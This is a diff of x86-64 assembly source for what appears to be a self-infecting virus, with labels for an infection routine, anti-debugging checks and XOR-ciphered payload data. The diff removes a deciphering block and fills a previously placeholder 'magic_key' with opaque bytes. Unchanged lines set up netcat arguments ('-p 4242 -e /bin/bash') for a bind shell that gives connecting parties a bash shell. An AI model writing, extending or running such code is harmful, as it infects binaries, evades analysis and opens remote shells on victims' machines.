@@ -111,14 +111,7 @@ can_run_infection:
 	je .process					; 	goto .process;
 .end_anti_debugging:
 
-.begin_uncipher:
-	lea rdi, [rel infection_routine]		; data = &infection_routine
-	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
-	lea rdx, [rel key]				; key = key
-	mov rcx, key_size				; key_size = key_size
-	call xor_cipher					; xor_cipher(data, size, key, key_size)
-	jmp .valid					; goto .valid
-.end_uncipher:
+
 .end_mixed_code:
 
 	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
@@ -495,7 +488,9 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0x00					; Will be replaced by a script
+magic_key: db 0xf0, 0xe8, 0x3d, 0x17, 0x0e, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd6, 0x32, 0xf6, 0x48, 0x79, 0x5f
+db 0x1a, 0x9a, 0x4b, 0x83, 0xf8, 0xb9, 0x75, 0x67, 0xe8, 0x82, 0xe8, 0x4a, 0x02, 0x48, 0x83, 0x13
+db 0x2f, 0xe4, 0xfc
 magic_key_size: equ $ - magic_key
 rand_buffer: times 624 dd 0
 rand_index: dd 0
